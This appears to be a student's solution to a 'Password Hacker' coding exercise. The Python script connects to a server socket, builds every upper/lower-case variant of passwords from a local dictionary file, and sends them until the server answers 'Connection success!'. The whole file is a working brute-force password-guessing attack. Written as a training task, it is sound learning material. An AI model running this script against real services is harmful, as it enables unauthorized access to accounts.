# write your code here
import socket
import sys
import itertools


class Hacker(object):

    def __init__(self, ip_address, port):
        self.ip_address = ip_address
        self.port = int(port)
        # self.msg = msg
        self.client_socket = socket.socket()
        self.address = (self.ip_address, self.port)

    def main(self):
        self.client_socket.connect(self.address)

        with open('c:\\Users\\Kolda2\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt',
                  'r') as passwords:
            while True:
                pass_list = []
                pass_seed = passwords.readline().rstrip('\n')
                original = pass_seed
                pass_seed = pass_seed.translate({ord(i): None for i in '0123456789'})
                trials = list(map(''.join, itertools.product(*zip(pass_seed.upper(), pass_seed.lower()))))
                for trial in trials:
                    pass_list.append(original.translate({ord(y): trial[x] for x, y in enumerate(pass_seed)}))

                for trial in pass_list:
                    self.client_socket.send(trial.encode())
                    response = self.client_socket.recv(1024)
                    response = response.decode()
                    if response == 'Connection success!':
                        print(trial)
                        return

    def closing(self):
        self.client_socket.close()


args = sys.argv
start = Hacker(*args[1:])
start.main()
start.closing()